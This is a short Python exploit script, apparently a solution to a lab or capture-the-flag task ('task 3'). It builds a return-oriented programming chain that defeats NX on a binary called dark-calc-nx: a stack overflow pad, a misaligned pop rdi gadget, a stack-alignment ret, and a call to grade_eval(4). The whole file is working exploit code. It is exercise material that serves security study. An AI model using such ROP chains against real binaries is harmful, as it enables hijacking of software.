#!/usr/bin/env python3
# 任务3：dark-calc-nx 开了 NX + ASLR，栈上不能执行，改成 ROP 拼 grade_eval(4)
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


# objdump 里 __libc_csu_init 结尾是 41 5e 41 5f c3（pop r14; pop r15; ret），
# 从 0x401a33 这个错位字节读起正好是 5f c3，也就是 pop rdi ; ret
POP_RDI = 0x401a33
RET = 0x401a34

p = b"A" * 16 + b"B" * 8
p += p64(POP_RDI) + p64(4)     # rdi = 4
p += p64(RET)                  # 多垫一个 ret，不然 printf 里栈不对齐会挂
p += p64(0x401978)             # grade_eval
p += p64(0x4016e0)             # exit@plt
p += p64(0)
sys.stdout.buffer.write(p)
